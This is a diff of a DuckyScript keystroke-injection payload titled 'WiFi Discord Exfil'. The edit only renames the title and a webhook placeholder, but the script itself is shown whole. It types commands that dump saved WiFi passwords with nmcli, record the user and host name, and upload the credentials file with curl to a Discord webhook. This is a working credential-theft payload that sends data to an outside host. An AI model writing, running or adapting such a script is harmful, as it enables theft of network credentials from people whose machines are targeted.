@@ -1,4 +1,4 @@
-REM Title: WiFi Discord Dump
+REM Title: WiFi Discord Exfil
 REM Author: UndedInside
 REM Description: Dumps WiFi creds and sends them via discord webhook
 
@@ -17,7 +17,7 @@ STRINGLN nmcli device wifi show-password > creds.txt
 STRINGLN info=`whoami`@`hostname`
 
 REM Send file:
-STRINGLN curl -F 'payload_json={"username": "'"$info"'", "content": "WiFi creds:"}' -F "file1=@creds.txt" "[WEBHOOK]" 
+STRINGLN curl -F 'payload_json={"username": "'"$info"'", "content": "WiFi creds:"}' -F "file1=@creds.txt" "[WEBHOOK URL]" 
 DELAY 700
 
 REM Cleanup:
